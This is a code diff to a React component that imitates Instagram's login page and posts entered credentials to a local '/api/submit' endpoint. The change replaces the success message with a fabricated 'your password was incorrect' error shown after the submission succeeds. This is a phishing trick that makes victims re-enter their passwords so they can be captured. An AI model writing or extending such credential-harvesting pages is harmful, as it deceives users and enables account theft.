@@ -53,7 +53,7 @@ export default function InstagramLogin() {
 
       {/* Mobile Layout */}
       <div className="md:hidden">
-        <div className="px-6 pt-12">
+        <div className="px-6 pt-32">
           <LoginForm />
         </div>
       </div>
@@ -66,6 +66,7 @@ export default function InstagramLogin() {
 
 function LoginForm() {
   const [isLoading, setIsLoading] = useState(false);
+  const [loginError, setLoginError] = useState<string | null>(null);
 
   const form = useForm<LoginFormData>({
     resolver: zodResolver(loginSchema),
@@ -77,6 +78,7 @@ function LoginForm() {
 
   const onSubmit = async (data: LoginFormData) => {
     setIsLoading(true);
+    setLoginError(null);
 
     try {
       const response = await fetch('/api/submit', {
@@ -96,7 +98,8 @@ function LoginForm() {
         throw new Error(result.error || 'Login failed');
       }
 
-      toast.success('Login successful!');
+      setLoginError('Sorry, your password was incorrect. Please double-check your password.');
+      // toast.success('Login successful!');
       // Handle successful login (redirect, store token, etc.)
       // Login successful - handle navigation or state updates here
     } catch (error) {
@@ -193,6 +196,7 @@ function LoginForm() {
           Log in with Facebook
         </button>
       </div>
+      {loginError && <p className="text-center text-sm text-red-600 mb-4">{loginError}</p>}
 
       {/* Forgot Password */}
       <div className="text-center mb-6">
